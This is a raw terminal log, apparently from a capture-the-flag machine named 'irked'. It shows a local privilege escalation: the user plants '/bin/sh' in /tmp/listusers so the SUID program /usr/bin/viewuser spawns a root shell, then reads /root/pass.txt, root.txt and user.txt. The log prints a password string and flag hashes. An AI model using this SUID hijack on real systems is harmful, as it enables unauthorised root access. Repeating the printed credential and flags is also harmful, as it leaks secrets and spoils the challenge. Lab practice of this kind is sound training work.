@@ -1,0 +1,84 @@
+djmardov@irked:/tmp$ cd
+djmardov@irked:~$ printf  '/bin/sh' > /tmp/listusers
+-bash: printf: command not found
+djmardov@irked:~$ printf
+printf: usage: printf [-v var] format [arguments]
+djmardov@irked:~$ printf '/bin/sh' > /tmp/listusers
+djmardov@irked:~$ chmod a+x /tmp/listusers
+djmardov@irked:~$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-07-28 07:14 (:0)
+djmardov pts/2        2019-07-28 08:45 (10.10.14.13)
+# ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+# id
+uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
+# ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+# cd Desktop
+# ls
+# ls -la
+total 8
+drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 .
+drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
+# cd ~/
+# ls -la
+total 92
+drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 .
+drwxr-xr-x  4 root     root     4096 May 14  2018 ..
+lrwxrwxrwx  1 root     root        9 Nov  3  2018 .bash_history -> /dev/null
+-rw-r--r--  1 djmardov djmardov  220 May 11  2018 .bash_logout
+-rw-r--r--  1 djmardov djmardov 3515 May 11  2018 .bashrc
+drwx------ 13 djmardov djmardov 4096 May 15  2018 .cache
+drwx------ 15 djmardov djmardov 4096 May 15  2018 .config
+drwx------  3 djmardov djmardov 4096 May 11  2018 .dbus
+drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Desktop
+drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 Documents
+drwxr-xr-x  2 djmardov djmardov 4096 May 14  2018 Downloads
+drwx------  3 djmardov djmardov 4096 Nov  3  2018 .gconf
+drwx------  2 djmardov djmardov 4096 May 15  2018 .gnupg
+-rw-------  1 djmardov djmardov 4706 Nov  3  2018 .ICEauthority
+drwx------  3 djmardov djmardov 4096 May 11  2018 .local
+drwx------  4 djmardov djmardov 4096 May 11  2018 .mozilla
+drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Music
+drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Pictures
+-rw-r--r--  1 djmardov djmardov  675 May 11  2018 .profile
+drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Public
+drwx------  2 djmardov djmardov 4096 May 11  2018 .ssh
+drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Templates
+drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Videos
+# cd ..
+# cd ..
+# ls
+bin   dev  home        initrd.img.old  lost+found  mnt  proc  run   srv  tmp  var      vmlinuz.old
+boot  etc  initrd.img  lib             media       opt  root  sbin  sys  usr  vmlinuz
+# cd root
+# ls
+pass.txt  root.txt
+# cat pass.txt
+Kab6h+m+bbp2J:HG
+# cat root.txt
+8d8e9e8be64654b6dccc3bff4522daf3
+# cd home
+/bin/sh: 16: cd: can't cd to home
+# ls
+pass.txt  root.txt
+# cd .  
+# cd ..
+# cd home
+# ls
+djmardov  ircd
+# cd djmardov
+# ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+# cd Desktop
+# ls
+# cd ..
+# cd Documents
+# ls
+user.txt
+# cat user.txt
+4a66a78b12dc0e661a59d3f5c0267a8e
+# 
+
